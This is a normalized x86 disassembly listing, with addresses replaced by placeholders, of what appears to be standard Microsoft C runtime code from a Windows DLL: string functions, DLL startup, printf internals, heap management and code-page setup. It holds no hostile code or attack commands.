cmp eax 0xbff
jl r-xdata
cmppd xmm3 [ r--data ] 0x6
andpd xmm3 [ r--data ]
movq [ esp + 0x4 ] xmm3
fld [ esp + 0x4 ]
retn
cmp eax 0x432
jg r-xdata
fld [ r--data ]
retn
psllq xmm1 xmm2
cmp eax 0xc32
jg r-xdata
ucomisd xmm7 xmm7
jpo r-xdata
andpd xmm0 [ r--data ]
addsd xmm1 xmm0
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
fld [ esp + 0x4 ]
retn
mov edx 0x3ec
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x14
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_1000a687
add esp 0x10
sub_100064b0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp sub_10005986
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
sub_10006540
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_10006550
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edi edi
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_10006638
push 0x8
push r--data
call sub_10009700
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_1000b4f9
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_10008b16
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_100087c1
push 0x214
push 0x1
call sub_1000aaed
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_1000b4ad
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1000b416
mov [ rw-data ] eax
call sub_1000ae4d
test eax eax
jns r-xdata
call sub_1000b517
jmp r-xdata
call sub_10009745
retn 0xc
xor eax eax
inc eax
push edi
call sub_10008aa8
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_1000ae20
call sub_1000b35b
test eax eax
js r-xdata
call sub_100087f5
jmp r-xdata
push esi
call sub_100079a5
pop ecx
jmp r-xdata
push edi
push esi
call sub_10008832
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10006711
jmp r-xdata
call sub_1000b092
call sub_100087f5
call sub_1000b517
call sub_1000b092
jmp r-xdata
call sub_1000b0e5
test eax eax
js r-xdata
push 0x0
call sub_1000ac33
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1000679c
push 0xc
push r--data
call sub_10009700
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10003127
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_10006638
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_10006638
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10003127
push edi
push 0x0
push ebx
call sub_10006638
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_10009745
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1000679c
pop ecx
pop ebp
retn 0xc
call sub_1000b695
sub_100068b5
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_1000a215
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_10007892
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_10007892
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_10009172
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_1000a141
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_1000b8e8
pop ecx
test eax eax
jne r-xdata
call sub_10009172
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_1000a141
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1000b89f
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_1000b7b5
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_10006a19
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_100068b5
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_10006a4c
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_10006a19
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_10006a19
sub_10006aae
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x23c ] eax
call sub_100056cc
call sub_10007892
mov [ ebp - 0x26c ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_1000a215
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x274 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x274 ]
mov edi [ ebp - 0x21c ]
mov dl al
jmp r-xdata
sub_100076c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_10005100
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1000bbd5
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_1000bbd5
pop ecx
sub_100077ee
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_100076c5
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_10007813
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100077ee
int3
pop ebp
jmp eax
sub_10007850
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_100078b8
mov edi edi
push ebp
mov ebp esp
push esi
call sub_100078a5
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_10007850
pop ecx
mov esi eax
call sub_10007892
mov [ eax ] esi
pop esi
pop ebp
retn
sub_100078db
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_100079a5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_10007892
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10007850
pop ecx
mov [ esi ] eax
pop esi
sub_100079df
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_1000bbdd
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1000ab39
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1000ab39
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_10007a95
mov edi edi
push esi
push 0x4
push 0x20
call sub_1000aaed
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10007ac6
push 0xc
push r--data
call sub_10009700
call sub_1000abca
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_100079df
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10007afc
mov eax [ ebp - 0x1c ]
call sub_10009745
retn
sub_10007b19
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_10007bbc
pop ecx
call sub_10007892
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_1000bde5
push 0x1e
call sub_1000bc36
push 0xff
call sub_1000abb2
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_10007892
mov [ eax ] esi
push ebx
call sub_10007bbc
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_10007892
mov [ eax ] esi
sub_10007bbc
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_10007be4
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10007d33
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_10007892
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_10007840
mov eax esi
jmp r-xdata
sub_10007d92
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10007dc1
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_10005100
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_10007e25
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_1000c0b2
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10008e78
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10008e78
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_10005100
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_10007fb5
push 0xc
push r--data
call sub_10009700
call sub_1000895f
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_1000bf98
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10008050
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_10009745
retn
push 0x20
call sub_1000ae2f
cmp esi rw-data
je r-xdata
push esi
call sub_100079a5
pop ecx
sub_10008059
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
